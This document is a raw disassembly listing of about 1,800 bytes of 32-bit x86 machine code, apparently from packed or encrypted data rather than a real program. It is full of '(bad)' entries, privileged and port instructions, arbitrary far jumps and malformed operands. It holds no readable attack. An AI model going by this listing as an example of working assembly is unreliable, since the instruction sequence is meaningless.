  41b9a8:	or     edx,DWORD PTR [edx+0x53ff794e]
  41b9ae:	or     al,0xdb
  41b9b0:	leave  
  41b9b1:	xchg   ecx,eax
  41b9b2:	in     al,dx
  41b9b3:	fwait
  41b9b4:	push   0xffffff83
  41b9b6:	xchg   ebx,eax
  41b9b7:	push   0x18
  41b9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ba:	lods   eax,DWORD PTR ds:[esi]
  41b9bb:	inc    esi
  41b9bc:	xchg   esp,eax
  41b9bd:	or     al,0x69
  41b9bf:	stc    
  41b9c0:	mov    bh,0x5b
  41b9c2:	xor    al,0x10
  41b9c4:	(bad)  
  41b9c5:	mov    bl,0x77
  41b9c7:	(bad)
  41b9ca:	data16 jb 0x41b9e4
  41b9cd:	lahf   
  41b9ce:	add    esp,DWORD PTR [ebx]
  41b9d0:	inc    edi
  41b9d1:	pop    esi
  41b9d2:	xor    al,0x8c
  41b9d4:	or     dl,ah
  41b9d6:	push   0xffffffb0
  41b9d8:	out    dx,al
  41b9d9:	lods   eax,DWORD PTR ds:[esi]
  41b9da:	pushf  
  41b9db:	das    
  41b9dc:	mov    edi,0xd77dba38
  41b9e1:	push   0x71af74fd
  41b9e6:	and    ch,dh
  41b9e8:	mov    edi,0xd1f86c7f
  41b9ed:	mov    eax,ds:0xe886880c
  41b9f2:	iret   
  41b9f3:	push   cs
  41b9f4:	mov    al,0x92
  41b9f6:	cmp    BYTE PTR [ecx-0x557d9ebd],ah
  41b9fc:	aaa    
  41b9fd:	xor    ebp,0x5f37b80b
  41ba03:	cmp    eax,0x553808b7
  41ba08:	xchg   edx,eax
  41ba09:	xchg   BYTE PTR [ecx],cl
  41ba0b:	into   
  41ba0c:	stos   BYTE PTR es:[edi],al
  41ba0d:	pop    es
  41ba0e:	xchg   edx,eax
  41ba0f:	add    al,0x62
  41ba11:	or     al,0xe4
  41ba13:	pop    es
  41ba14:	jmp    0xff93:0x125eff77
  41ba1b:	sbb    DWORD PTR [esi+0x1c],eax
  41ba1e:	pop    ecx
  41ba1f:	js     0x41ba22
  41ba21:	mov    edx,db6
  41ba24:	xchg   edi,eax
  41ba25:	cmp    al,0x34
  41ba27:	pop    ebp
  41ba28:	pop    es
  41ba29:	loopne 0x41ba03
  41ba2b:	rol    dl,0xa5
  41ba2e:	push   edi
  41ba2f:	in     eax,dx
  41ba30:	sbb    al,0xcc
  41ba32:	pop    ecx
  41ba33:	jl     0x41baa1
  41ba35:	rcl    ch,1
  41ba37:	push   ebp
  41ba38:	mov    eax,0xa071fa44
  41ba3d:	(bad)  
  41ba3e:	sub    al,0xe0
  41ba40:	jo     0x41ba58
  41ba42:	adc    BYTE PTR [edx-0x66],cl
  41ba45:	call   0xa5686ab
  41ba4a:	fiadd  WORD PTR [esi-0x203d45b9]
  41ba50:	ds int 0x8d
  41ba53:	fwait
  41ba54:	xor    al,BYTE PTR ds:0x85a026b0
  41ba5a:	imul   edx
  41ba5c:	and    edx,DWORD PTR [edi-0x69a97424]
  41ba62:	sti    
  41ba63:	mov    bl,0x50
  41ba65:	iret   
  41ba66:	push   edx
  41ba67:	ret    
  41ba68:	nop
  41ba69:	stos   DWORD PTR es:[edi],eax
  41ba6a:	dec    ecx
  41ba6b:	jnp    0x41ba6a
  41ba6d:	add    BYTE PTR [esi-0x69e5268c],ah
  41ba73:	push   edx
  41ba74:	fdivr  QWORD PTR [edi]
  41ba76:	out    0x55,eax
  41ba78:	repz xchg ch,dh
  41ba7b:	shr    bh,1
  41ba7d:	nop
  41ba7e:	sbb    BYTE PTR [esp+edx*2],0x7b
  41ba82:	(bad)  [ecx]
  41ba84:	mov    bh,0x1c
  41ba86:	inc    ebp
  41ba87:	inc    esp
  41ba88:	(bad)  ds:0x6a374327
  41ba8e:	or     esi,DWORD PTR [ebp+0x64]
  41ba91:	jne    0x41ba63
  41ba93:	jno    0x41ba62
  41ba95:	ins    BYTE PTR es:[edi],dx
  41ba96:	iret   
  41ba97:	sub    edi,DWORD PTR [ecx+ecx*2]
  41ba9a:	or     esp,esi
  41ba9c:	es adc dh,dl
  41ba9f:	ret    0x5d39
  41baa2:	dec    esi
  41baa3:	stc    
  41baa4:	inc    edi
  41baa5:	push   ds
  41baa6:	mov    dh,0x61
  41baa8:	sub    eax,0xa0d3a863
  41baad:	xlat   BYTE PTR ds:[ebx]
  41baae:	repnz neg DWORD PTR [eax+0x7a5ce32a]
  41bab5:	inc    ecx
  41bab6:	out    0x13,al
  41bab8:	pop    es
  41bab9:	scas   al,BYTE PTR es:[edi]
  41baba:	outs   dx,DWORD PTR ds:[esi]
  41babb:	jp     0x41bb31
  41babd:	xlat   BYTE PTR ds:[ebx]
  41babe:	and    al,0x14
  41bac0:	mov    BYTE PTR [eax-0x61],dh
  41bac3:	mov    eax,DWORD PTR [ebp+0x51]
  41bac6:	jmp    0x31f2:0x8dd466db
  41bacd:	out    0xe7,al
  41bacf:	lods   al,BYTE PTR ds:[esi]
  41bad0:	pop    edi
  41bad1:	lods   al,BYTE PTR ds:[esi]
  41bad2:	dec    edx
  41bad3:	inc    esi
  41bad4:	lahf   
  41bad5:	mov    ch,0x7a
  41bad7:	or     DWORD PTR [ecx+0xd],ecx
  41bada:	aam    0xe5
  41badc:	mov    eax,ds:0x307a6dfb
  41bae1:	gs cs aaa 
  41bae4:	cs scas al,BYTE PTR es:[edi]
  41bae6:	popa   
  41bae7:	test   BYTE PTR [ebx+0xa],ah
  41baea:	jmp    0x41bad2
  41baec:	aaa    
  41baed:	jp     0x41bad6
  41baef:	add    DWORD PTR [ebx-0x15],edi
  41baf2:	fmul   DWORD PTR [ecx+0x4f]
  41baf5:	retf   
  41baf6:	mov    ecx,0x70f64a7a
  41bafb:	cmp    eax,ecx
  41bafd:	and    esp,DWORD PTR [ecx+0x73]
  41bb00:	pop    edi
  41bb01:	loope  0x41bb38
  41bb03:	pop    es
  41bb04:	ja     0x41bac6
  41bb06:	(bad)  
  41bb07:	in     al,0xc7
  41bb09:	hlt    
  41bb0a:	ins    BYTE PTR es:[edi],dx
  41bb0b:	xchg   esp,eax
  41bb0c:	xchg   esi,eax
  41bb0d:	or     ebx,DWORD PTR [edi+0x25763e6c]
  41bb13:	ror    DWORD PTR [edi+0x25],0x78
  41bb17:	out    dx,eax
  41bb18:	dec    edx
  41bb19:	xor    al,0xba
  41bb1b:	sbb    al,0xcc
  41bb1d:	in     eax,dx
  41bb1e:	pop    ebx
  41bb1f:	push   ebx
  41bb20:	push   ds
  41bb21:	jl     0x41bb6a
  41bb23:	xchg   ecx,eax
  41bb24:	out    dx,al
  41bb25:	xor    DWORD PTR [edi+eax*2-0x32b0db3a],ebp
  41bb2c:	mov    ds,WORD PTR [esi]
  41bb2e:	cld    
  41bb2f:	in     eax,0xb9
  41bb31:	add    ah,BYTE PTR [ebx-0x21cc759f]
  41bb37:	xchg   esp,eax
  41bb38:	push   0xffffffa7
  41bb3a:	mov    ebp,0xfce491c9
  41bb3f:	push   0x9b5ab659
  41bb44:	call   0x22c9:0x59f51891
  41bb4b:	jne    0x41bba9
  41bb4d:	pop    eax
  41bb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb4f:	xchg   ecx,eax
  41bb50:	jnp    0x41bafb
  41bb52:	retf   0xcf15
  41bb55:	addr16 push ss
  41bb57:	mov    cl,BYTE PTR [ebx+0x33]
  41bb5a:	pop    ebp
  41bb5b:	and    al,0xe7
  41bb5d:	add    eax,0x50ce7497
  41bb62:	mov    cl,0x4
  41bb64:	sbb    ah,BYTE PTR [edi]
  41bb66:	push   ebx
  41bb67:	or     al,0x90
  41bb69:	repnz push eax
  41bb6b:	inc    esp
  41bb6c:	jmp    0x1b5b9ad1
  41bb71:	daa    
  41bb72:	iret   
  41bb73:	fsincos 
  41bb75:	and    BYTE PTR [ebx-0x10],ch
  41bb78:	(bad)
  41bb7b:	dec    edi
  41bb7c:	out    0x33,al
  41bb7e:	or     eax,0xc78270d7
  41bb83:	push   ecx
  41bb84:	jg     0x41bb59
  41bb86:	inc    ebp
  41bb87:	inc    edx
  41bb88:	daa    
  41bb89:	ror    DWORD PTR [edx+0x1b],0x9f
  41bb8d:	clc    
  41bb8e:	xchg   DWORD PTR [ecx],ecx
  41bb90:	cdq    
  41bb91:	adc    eax,0x811d93ae
  41bb96:	push   edi
  41bb97:	inc    ebp
  41bb98:	jge    0x41bb3f
  41bb9a:	int    0xca
  41bb9c:	mov    DWORD PTR [eax],edi
  41bb9e:	dec    esp
  41bb9f:	daa    
  41bba0:	leave  
  41bba1:	int3   
  41bba2:	in     al,dx
  41bba3:	stos   BYTE PTR es:[edi],al
  41bba4:	or     BYTE PTR [edi],al
  41bba6:	pop    ebp
  41bba7:	add    ebx,ebp
  41bba9:	loopne 0x41bb9c
  41bbab:	test   BYTE PTR [edx],al
  41bbad:	and    edi,esp
  41bbaf:	pop    ebx
  41bbb0:	cmp    BYTE PTR [ebp+eiz*8+0x750e359],bl
  41bbb7:	mov    ds:0x5c31c391,eax
  41bbbc:	sbb    eax,0x302cac75
  41bbc1:	(bad)  
  41bbc2:	cmp    BYTE PTR [eax],bl
  41bbc4:	push   cs
  41bbc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc6:	jp     0x41bb8b
  41bbc8:	imul   dh
  41bbca:	and    dl,ah
  41bbcc:	jns    0x41bc48
  41bbce:	dec    ebp
  41bbcf:	je     0x41bbc4
  41bbd1:	cmc    
  41bbd2:	mov    ecx,0x68462b8c
  41bbd7:	dec    edx
  41bbd8:	mov    edi,0x4ec3eaef
  41bbdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbde:	fisubr DWORD PTR [edx-0x3c6e4fc9]
  41bbe4:	sbb    ebp,ebx
  41bbe6:	into   
  41bbe7:	push   eax
  41bbe8:	mov    al,ds:0x493251ac
  41bbed:	js     0x41bb89
  41bbef:	shl    DWORD PTR [esp+ecx*2-0x24],1
  41bbf3:	data16 fsubr st(6),st
  41bbf6:	xor    BYTE PTR [edx-0x9],0xb7
  41bbfa:	mov    DWORD PTR [edx],esi
  41bbfc:	pop    ds
  41bbfd:	xchg   ebx,eax
  41bbfe:	sub    ch,dh
  41bc00:	mov    eax,0x91bf4b3b
  41bc05:	sub    al,0x4d
  41bc07:	daa    
  41bc08:	js     0x41bbb8
  41bc0a:	sub    al,0x6
  41bc0c:	mov    edx,0x76d510f1
  41bc11:	fwait
  41bc12:	xlat   BYTE PTR ds:[ebx]
  41bc13:	hlt    
  41bc14:	push   0xffe0e92c
  41bc19:	aaa    
  41bc1a:	push   cs
  41bc1b:	cld    
  41bc1c:	retf   
  41bc1d:	xchg   ecx,eax
  41bc1e:	sbb    bl,BYTE PTR [bp+di+0x4595]
  41bc23:	xor    DWORD PTR [edx+esi*4],ebp
  41bc26:	add    al,0xc1
  41bc28:	push   ss
  41bc29:	in     eax,0x44
  41bc2b:	xor    BYTE PTR [ebx-0x33],al
  41bc2e:	lock xor al,0xcb
  41bc31:	(bad)
  41bc34:	sbb    ebx,ebp
  41bc36:	or     ch,0xe4
  41bc39:	mov    ecx,0x25ebda04
  41bc3e:	or     eax,0xa3b924d1
  41bc43:	sbb    bh,BYTE PTR [eax]
  41bc45:	loop   0x41bcb3
  41bc47:	mov    eax,ds:0xde3e6c33
  41bc4c:	mov    edi,0x4d03af56
  41bc51:	and    al,BYTE PTR [esi+0x22]
  41bc54:	outs   dx,BYTE PTR ds:[esi]
  41bc55:	push   ds
  41bc56:	lock addr16 popf 
  41bc59:	jbe    0x41bc3e
  41bc5b:	je     0x41bc8b
  41bc5d:	jp     0x41bcc4
  41bc5f:	pushf  
  41bc60:	and    DWORD PTR [eax-0x41],0x3a677037
  41bc67:	jo     0x41bc41
  41bc69:	stc    
  41bc6a:	movnti DWORD PTR [esi],edx
  41bc6d:	sbb    BYTE PTR [ebp-0x59990d83],bh
  41bc73:	add    al,0x4
  41bc75:	sub    eax,0x9ae6e4cb
  41bc7a:	mov    ecx,0x5b0fc738
  41bc7f:	lods   eax,DWORD PTR ds:[esi]
  41bc80:	lds    ebx,FWORD PTR [edi]
  41bc82:	xchg   edi,eax
  41bc83:	arpl   WORD PTR [edx],si
  41bc85:	add    ecx,DWORD PTR [ebx]
  41bc87:	xchg   ebx,eax
  41bc88:	and    al,0x18
  41bc8a:	jge    0x41bcf5
  41bc8c:	clc    
  41bc8d:	push   ebp
  41bc8e:	gs jne 0x41bc39
  41bc91:	neg    BYTE PTR [edx-0x5e1ca892]
  41bc97:	add    eax,0xaae54844
  41bc9c:	jnp    0x41bcb4
  41bc9e:	dec    edi
  41bc9f:	stos   BYTE PTR es:[edi],al
  41bca0:	cmp    al,0x72
  41bca2:	dec    ecx
  41bca3:	enter  0x305e,0x42
  41bca7:	sub    BYTE PTR [ebx+0x79b0a75f],ah
  41bcad:	push   es
  41bcae:	stos   DWORD PTR es:[edi],eax
  41bcaf:	(bad)  
  41bcb0:	or     BYTE PTR [ebp+0xe],al
  41bcb3:	or     al,0xba
  41bcb5:	xchg   edx,eax
  41bcb6:	and    DWORD PTR [ebp+ecx*1+0x400476c7],edi
  41bcbd:	pop    ebp
  41bcbe:	push   es
  41bcbf:	enter  0x8348,0x36
  41bcc3:	test   BYTE PTR [ebp-0x557e06e],bl
  41bcc9:	mov    dh,0xf1
  41bccb:	into   
  41bccc:	test   eax,0x7c50776f
  41bcd1:	fnsave ds:0x65188b89
  41bcd7:	pop    esp
  41bcd8:	xchg   esp,eax
  41bcd9:	mov    ?,ebp
  41bcdb:	sbb    eax,0x9343875d
  41bce0:	add    ebx,0xffffffa5
  41bce3:	stc    
  41bce4:	lock mov esi,0x5e3f1d7c
  41bcea:	std    
  41bceb:	test   eax,0xd28b07d6
  41bcf0:	retf   
  41bcf1:	fimul  WORD PTR [esi+0x62]
  41bcf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcf5:	inc    esi
  41bcf6:	cdq    
  41bcf7:	pop    ebx
  41bcf8:	jg     0x41bd17
  41bcfa:	outs   dx,DWORD PTR ds:[esi]
  41bcfb:	int3   
  41bcfc:	pop    ds
  41bcfd:	push   cs
  41bcfe:	std    
  41bcff:	enter  0x5db3,0x3c
  41bd03:	mov    DWORD PTR [ecx+0x31],esi
  41bd06:	lods   eax,DWORD PTR ds:[esi]
  41bd07:	pusha  
  41bd08:	sub    ebp,DWORD PTR [ecx+0x1d]
  41bd0b:	push   edi
  41bd0c:	lds    ecx,FWORD PTR [ebx-0x30214d98]
  41bd12:	sbb    eax,0x4037e42e
  41bd17:	cmc    
  41bd18:	mov    al,0x73
  41bd1a:	(bad)  
  41bd1b:	push   ss
  41bd1c:	jae    0x41bd5d
  41bd1e:	fld    TBYTE PTR [ecx-0x594c6849]
  41bd24:	pop    ds
  41bd25:	loope  0x41bcec
  41bd27:	pop    ss
  41bd28:	shl    BYTE PTR [eax-0x35],cl
  41bd2b:	popf   
  41bd2c:	pop    edi
  41bd2d:	mov    cl,0x8a
  41bd2f:	inc    ecx
  41bd30:	jmp    0x41bcd9
  41bd32:	ins    DWORD PTR es:[edi],dx
  41bd33:	push   0x73
  41bd35:	jge    0x41bcd6
  41bd37:	mov    ecx,0xed1e4ccf
  41bd3c:	sub    al,0x28
  41bd3e:	cmp    BYTE PTR [ebx],bh
  41bd40:	sbb    eax,0x4146e571
  41bd45:	and    al,0xd4
  41bd47:	hlt    
  41bd48:	sub    ch,BYTE PTR [edi]
  41bd4a:	out    0x73,al
  41bd4c:	inc    eax
  41bd4d:	mov    cl,0x94
  41bd4f:	ja     0x41bd33
  41bd51:	adc    BYTE PTR [edx+0x13],bh
  41bd54:	sahf   
  41bd55:	std    
  41bd56:	mov    ecx,0x3249e858
  41bd5b:	dec    edx
  41bd5c:	popf   
  41bd5d:	add    ebp,ebx
  41bd5f:	clc    
  41bd60:	or     esi,DWORD PTR [eax-0x74]
  41bd63:	pushf  
  41bd64:	and    ah,0x6f
  41bd67:	ss xor al,0x8f
  41bd6a:	enter  0x3bb0,0x27
  41bd6e:	fadd   DWORD PTR [edx+0x5909138f]
  41bd74:	add    eax,0x1281f4e9
  41bd79:	push   cs
  41bd7a:	mov    dh,0x2
  41bd7c:	stos   BYTE PTR es:[edi],al
  41bd7d:	adc    ebx,ebx
  41bd7f:	jno    0x41bda9
  41bd81:	daa    
  41bd82:	out    0x2,al
  41bd84:	or     al,0x3f
  41bd86:	jmp    0x273724dd
  41bd8b:	push   cs
  41bd8c:	retf   
  41bd8d:	inc    eax
  41bd8e:	push   ebx
  41bd8f:	rcr    BYTE PTR [esi-0x45],0xfe
  41bd93:	das    
  41bd94:	mov    dh,0x2a
  41bd96:	pusha  
  41bd97:	je     0x41bdb5
  41bd99:	push   ecx
  41bd9a:	dec    DWORD PTR [edx]
  41bd9c:	loopne 0x41bd69
  41bd9e:	dec    eax
  41bd9f:	sub    al,0xf2
  41bda1:	sub    eax,0x479077c4
  41bda6:	in     al,dx
  41bda7:	ja     0x41bd2a
  41bda9:	test   eax,0xaf2e2da3
  41bdae:	(bad)  
  41bdaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdb0:	fs test al,ch
  41bdb3:	xchg   BYTE PTR [eax*1+0x2fffdbae],ah
  41bdba:	push   edx
  41bdbb:	mov    es,WORD PTR [eax+0x76c803c5]
  41bdc1:	mov    ecx,0xa120d266
  41bdc6:	mov    ds:0x4fab09a2,al
  41bdcb:	cld    
  41bdcc:	add    eax,edx
  41bdce:	xchg   esp,eax
  41bdcf:	adc    al,BYTE PTR [eax]
  41bdd1:	sti    
  41bdd2:	cmp    eax,eax
  41bdd4:	addr16 add eax,0x81522dcd
  41bdda:	into   
  41bddb:	arpl   WORD PTR [esp+ecx*2-0x6d],bx
  41bddf:	ja     0x41be55
  41bde1:	jae    0x41be61
  41bde3:	add    eax,0x808c11ca
  41bde8:	cmp    ecx,DWORD PTR [edx+0x50]
  41bdeb:	enter  0x8f89,0x32
  41bdef:	(bad)  
  41bdf0:	test   BYTE PTR [ecx],0x5
  41bdf3:	xor    DWORD PTR [esi-0x3a54417c],esi
  41bdf9:	push   es
  41bdfa:	inc    esi
  41bdfb:	sbb    eax,0x65ab7394
  41be00:	jmp    0x23df:0xe3f091a
  41be07:	sub    esi,DWORD PTR [ebx-0x3c]
  41be0a:	mov    ch,0xd1
  41be0c:	or     DWORD PTR [esi+ebx*2+0x53],edi
  41be10:	jno    0x41be0c
  41be12:	stc    
  41be13:	int3   
  41be14:	push   ss
  41be15:	mov    ecx,0xff0cc9f7
  41be1a:	mov    cl,0x72
  41be1c:	xor    DWORD PTR [ecx+0x40],esi
  41be1f:	out    0xbb,eax
  41be21:	cli    
  41be22:	ror    edi,cl
  41be24:	sar    DWORD PTR [ecx+0x34],cl
  41be27:	adc    al,0xf8
  41be29:	fidiv  DWORD PTR ds:0x8ddeb3ce
  41be2f:	mov    esp,DWORD PTR [eax+edx*2+0x6085c93d]
  41be36:	lahf   
  41be37:	push   ebp
  41be38:	dec    esi
  41be39:	je     0x41be7c
  41be3b:	jb     0x41bdc3
  41be3d:	mov    DWORD PTR [ebp-0x7b],ebx
  41be40:	xchg   ebx,eax
  41be41:	cmove  ebp,DWORD PTR [ecx-0x16]
  41be45:	push   ecx
  41be46:	int    0x80
  41be48:	push   cs
  41be49:	mov    cl,0x80
  41be4b:	iret   
  41be4c:	cmp    eax,0x9c11c291
  41be51:	nop
  41be52:	orps   xmm0,XMMWORD PTR [ecx+0x77]
  41be56:	mov    edx,0x7f6ddb08
  41be5b:	jg     0x41be56
  41be5d:	(bad)  
  41be5e:	jge    0x41bed7
  41be60:	lds    eax,FWORD PTR [ebx+ebx*2-0x10]
  41be64:	out    0x5f,eax
  41be66:	or     edx,DWORD PTR [edx+0x51]
  41be69:	aam    0x10
  41be6b:	sbb    al,0xb9
  41be6d:	call   0x7742:0xa6c2be9b
  41be74:	lahf   
  41be75:	xor    BYTE PTR [edi],bl
  41be77:	lods   al,BYTE PTR ds:[esi]
  41be78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be79:	and    esp,DWORD PTR [eax+0x2e5fad8]
  41be7f:	lea    ebp,[ecx+0x7a8961b2]
  41be85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be86:	push   esi
  41be87:	xchg   esp,eax
  41be88:	mov    ds:0xc987a7e9,eax
  41be8d:	dec    edx
  41be8e:	int3   
  41be8f:	cmp    eax,0xd70adfa1
  41be94:	jmp    0x86a222fa
  41be99:	mov    esp,DWORD PTR [esi+ecx*4-0x32aa8bc]
  41bea0:	fiadd  DWORD PTR [eax]
  41bea2:	or     BYTE PTR [eax-0x4],ah
  41bea5:	dec    ecx
  41bea6:	fdivr  DWORD PTR [ebx]
  41bea8:	adc    al,0x6
  41beaa:	cld    
  41beab:	cmp    BYTE PTR [ecx],dh
  41bead:	ins    BYTE PTR es:[edi],dx
  41beae:	aas    
  41beaf:	ins    DWORD PTR es:[edi],dx
  41beb0:	cmc    
  41beb1:	es es stc 
  41beb4:	or     dh,dh
  41beb6:	mov    bh,0xe3
  41beb8:	push   ecx
  41beb9:	loope  0x41be85
  41bebb:	pop    ebp
  41bebc:	pop    ds
  41bebd:	stos   BYTE PTR es:[edi],al
  41bebe:	jecxz  0x41be77
  41bec0:	inc    ebx
  41bec1:	nop
  41bec2:	aam    0x3f
  41bec4:	pop    esp
  41bec5:	jge    0x41bed5
  41bec7:	pushf  
  41bec8:	cmp    DWORD PTR ds:[eax-0x44b7ddf2],ecx
  41becf:	push   0xbfda02b
  41bed4:	mov    ah,0x2c
  41bed6:	(bad)  
  41bed7:	in     eax,dx
  41bed8:	add    esp,DWORD PTR [eax+edx*8+0x6412546d]
  41bedf:	popa   
  41bee0:	outs   dx,BYTE PTR ds:[esi]
  41bee1:	xor    al,0x4f
  41bee3:	push   edi
  41bee4:	push   ebp
  41bee5:	loop   0x41beb3
  41bee7:	(bad)  
  41bee8:	aad    0x50
  41beea:	ss mov ebp,DWORD PTR gs:[edi+0x154f1a06]
  41bef2:	xchg   ebp,eax
  41bef3:	faddp  st(1),st
  41bef5:	nop
  41bef6:	adc    al,0xee
  41bef8:	cdq    
  41bef9:	sbb    edi,edi
  41befb:	push   edx
  41befc:	sub    cl,BYTE PTR [edi-0x77105a0a]
  41bf02:	push   esi
  41bf03:	and    cl,BYTE PTR [edx+edi*2]
  41bf06:	rcr    DWORD PTR [ecx],cl
  41bf08:	xor    esp,edi
  41bf0a:	sbb    DWORD PTR [eax-0x4ff12c3c],esi
  41bf10:	ss adc eax,edx
  41bf13:	mov    bh,0x2e
  41bf15:	adc    BYTE PTR [edi-0x22cb2ceb],ah
  41bf1b:	ret    0x53b6
  41bf1e:	std    
  41bf1f:	popf   
  41bf20:	mov    edi,ebp
  41bf22:	or     BYTE PTR [eax],dh
  41bf24:	push   ebp
  41bf25:	mov    al,ds:0x475bcc8b
  41bf2a:	adc    ch,cl
  41bf2c:	sbb    DWORD PTR [edx],esp
  41bf2e:	mov    edx,0x3efc8eb4
  41bf33:	inc    ebp
  41bf34:	mov    edi,ebp
  41bf36:	sbb    eax,0xfe6e6cf9
  41bf3b:	test   al,0x5
  41bf3d:	fwait
  41bf3e:	xlat   BYTE PTR ds:[ebx]
  41bf3f:	cmp    al,0xe5
  41bf41:	jl     0x41bf67
  41bf43:	popf   
  41bf44:	jmp    0xb2c4b5fb
  41bf49:	retf   
  41bf4a:	cld    
  41bf4b:	int3   
  41bf4c:	jo     0x41bf65
  41bf4e:	add    eax,0x827ea94e
  41bf53:	ins    DWORD PTR es:[edi],dx
  41bf54:	aas    
  41bf55:	and    BYTE PTR fs:[ecx+0x5a],dl
  41bf59:	or     eax,0x3c9095b4
  41bf5e:	sbb    DWORD PTR [ebx+0x74c7553e],ebp
  41bf64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf65:	scas   eax,DWORD PTR es:[edi]
  41bf66:	hlt    
  41bf67:	fdiv   DWORD PTR [eax]
  41bf69:	cmp    dl,cl
  41bf6b:	das    
  41bf6c:	int    0x1d
  41bf6e:	hlt    
  41bf6f:	add    DWORD PTR [ebx+0x24],eax
  41bf72:	cli    
  41bf73:	and    DWORD PTR [edi-0x4287a449],esp
  41bf79:	sbb    DWORD PTR [ebx+0x7f],ecx
  41bf7c:	rcl    bh,0x5
  41bf7f:	mov    ds:0xd0cc3d54,al
  41bf84:	mov    ah,0x6a
  41bf86:	adc    ebp,DWORD PTR [esp+ecx*8+0x8]
  41bf8a:	adc    esi,ecx
  41bf8c:	clc    
  41bf8d:	outs   dx,DWORD PTR ds:[esi]
  41bf8e:	lock xor BYTE PTR [esi],0x69
  41bf92:	mov    esi,0x6960969d
  41bf97:	inc    ebp
  41bf98:	(bad)  
  41bf99:	out    0xb3,eax
  41bf9b:	push   cs
  41bf9c:	jnp    0x41bf20
  41bf9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf9f:	cmp    al,0xf9
  41bfa1:	ss aad 0x40
  41bfa4:	jbe    0x41bf44
  41bfa6:	push   cs
  41bfa7:	add    al,0x15
  41bfa9:	mov    ds:0x917211f2,al
  41bfaf:	sbb    dh,BYTE PTR [esi]
  41bfb1:	inc    esi
  41bfb2:	leave  
  41bfb3:	out    dx,al
  41bfb4:	dec    esi
  41bfb5:	std    
  41bfb6:	or     dh,BYTE PTR [ecx]
  41bfb8:	test   eax,0x565b7d4c
  41bfbd:	pop    ecx
  41bfbe:	shl    DWORD PTR [esi-0x4f],0x87
  41bfc2:	retf   
  41bfc3:	adc    al,0xe8
  41bfc5:	shl    cl,cl
  41bfc7:	inc    edi
  41bfc8:	sub    DWORD PTR [ebx+0x14e1239a],esi
  41bfce:	pop    esi
  41bfcf:	adc    DWORD PTR [esi+0x3e74300d],eax
  41bfd5:	xor    al,0x4a
  41bfd7:	mov    eax,ds:0x61437ea0
  41bfdc:	fld    DWORD PTR [eax]
  41bfde:	cmp    eax,0x2748641e
  41bfe3:	into   
  41bfe4:	and    DWORD PTR [edi+0x2a],ecx
  41bfe7:	sti    
  41bfe8:	test   BYTE PTR [ecx],bl
  41bfea:	mov    dh,0x59
  41bfec:	mov    cl,0xf0
  41bfee:	cmc    
  41bfef:	mov    bh,0xe7
  41bff1:	mov    ah,0x9b
  41bff3:	jecxz  0x41bfe4
  41bff5:	or     BYTE PTR [edx-0x38],0xaf
  41bff9:	cld    
  41bffa:	xchg   edx,eax
  41bffb:	sar    BYTE PTR [ebx],1
  41bffd:	ret    
  41bffe:	out    0x89,al
  41c000:	mov    ebp,0x6c63f9a3
  41c005:	pop    ds
  41c006:	and    ebp,DWORD PTR [edx-0x34]
  41c009:	sar    esp,0xc3
  41c00c:	or     edi,ebp
  41c00e:	pop    ds
  41c00f:	mov    ebp,0x114e491f
  41c014:	mov    eax,ds:0xf1883061
  41c019:	aaa    
  41c01a:	out    dx,al
  41c01b:	adc    al,0xcc
  41c01d:	jmp    0x41c08b
  41c01f:	pop    esp
  41c020:	dec    esp
  41c021:	test   al,0x3b
  41c023:	(bad)  
  41c024:	cmp    eax,0xca90cec2
  41c029:	pop    ebx
  41c02a:	jg     0x41c030
  41c02c:	frstor [eax-0x22]
  41c02f:	mov    al,0x1a
  41c031:	dec    edi
  41c032:	mov    ah,0xa9
  41c034:	adc    edx,DWORD PTR [eax-0x35]
  41c037:	jne    0x41c07f
  41c039:	pushf  
  41c03a:	(bad)  
  41c03b:	in     al,dx
  41c03c:	sbb    ebp,DWORD PTR [edi]
  41c03e:	xor    al,0x84
  41c040:	repnz mov ds:0x26e66605,al
  41c046:	or     BYTE PTR [edx],al
  41c048:	xor    eax,0x8078b688
  41c04d:	xchg   ebx,eax
  41c04e:	mov    ds:0x2d634f1a,eax
  41c053:	sub    esp,eax
  41c055:	or     eax,0x18d0601a
  41c05a:	and    ch,BYTE PTR ds:0xce08fcc9
  41c060:	je     0x41c023
  41c062:	rol    DWORD PTR [ecx+0x4],cl
  41c065:	mov    dh,dl
  41c067:	pop    esi
  41c068:	xchg   ecx,eax
  41c069:	jmp    0x1f5b3c82
  41c06e:	sti    
  41c06f:	push   esi
  41c070:	or     al,0xb7
  41c072:	test   eax,0x21b3b32a
  41c077:	js     0x41c021
  41c079:	and    DWORD PTR [edx-0x5],esi
  41c07c:	or     esp,esp
  41c07e:	popf   
  41c07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c080:	call   0x90d3d470
  41c085:	std    
  41c086:	aad    0x78
  41c088:	dec    edx
  41c089:	and    bl,ch
  41c08b:	adc    al,0x46
  41c08d:	sar    ebx,1
  41c08f:	adc    BYTE PTR [ecx-0xc3d76aa],ch
  41c095:	push   ecx
  41c096:	arpl   bp,bp
  41c098:	xor    bh,cl
  41c09a:	mov    eax,0x5a453c74
  41c09f:	sbb    al,0x6
  41c0a1:	(bad)  
  41c0a2:	call   FWORD PTR [esi]
  41c0a4:	retf   0xbb54
  41c0a7:	add    DWORD PTR [ecx],edi
  41c0a9:	faddp  st(6),st
  41c0ab:	add    eax,0xbb2d9d92
  41c0b0:	push   edx
  41c0b1:	mov    bl,0xbc
  41c0b3:	jmp    0x41c0cb
  41c0b5:	mov    ah,0x66
  41c0b7:	gs scas eax,DWORD PTR es:[edi]
  41c0b9:	xor    eax,0xd614112
  41c0be:	jcxz   0x41c051
  41c0c1:	dec    esp
  41c0c2:	lahf   
  41c0c3:	mov    al,0xf1
  41c0c5:	cmp    DWORD PTR [ebp-0xfaea91d],edx
  41c0cb:	jmp    0x12fd39c4
  41c0d0:	jecxz  0x41c076
  41c0d2:	hlt    
  41c0d3:	pop    edx
